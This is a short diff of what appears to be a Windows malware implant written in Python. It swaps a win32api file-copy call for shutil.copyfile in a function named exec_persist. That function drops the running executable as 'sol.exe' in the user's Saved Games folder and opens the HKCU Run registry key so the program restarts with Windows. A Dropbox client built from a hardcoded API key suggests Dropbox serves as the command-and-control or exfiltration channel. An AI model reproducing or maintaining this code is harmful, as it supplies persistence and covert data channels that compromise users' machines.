@@ -1,5 +1,5 @@
 from winreg import *
-from win32api import CopyFile
+from shutil import copyfile
 import requests
 import os
 import dropbox
@@ -13,7 +13,6 @@ import ctypes
 import subprocess
 import uuid
 import sys
-
 apiKey = "drxEmLRljpAAAAAAAAAADQfl_issiL1iWeiaLuHhdkwXsIhSkzEhDhoNkZJp3ev2"
 # Create a dropbox object
 dbx = dropbox.Dropbox(apiKey)
@@ -132,7 +131,7 @@ def exec_persist():
     filedrop = r'%s\Saved Games\%s' % (os.path.expandvars("%userprofile%"), 'sol.exe')
     currentExecutable = sys.executable
     try:
-        CopyFile(currentExecutable, filedrop, 0)
+        copyfile(currentExecutable, filedrop)
 
         keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
         key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
